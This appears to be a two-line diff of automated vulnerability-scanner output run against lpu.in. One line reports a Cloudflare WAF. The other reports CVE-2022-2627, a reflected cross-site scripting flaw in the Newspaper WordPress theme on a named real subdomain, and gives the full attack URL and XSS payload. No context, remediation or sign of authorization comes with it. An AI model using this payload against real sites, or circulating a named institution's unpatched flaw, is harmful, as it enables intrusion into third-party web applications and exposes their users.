@@ -1,0 +1,2 @@
+[dns-waf-detect:cloudflare] [dns] [info] lpu.in
+[CVE-2022-2627] [http] [medium] https://happenings.lpu.in/wp-admin/admin-ajax.php?td_theme_name=Newspaper&v=11.2 [xss_payload="--><form><math><img+onerror=alert(document.domain)+src=1><mtext></form>"]
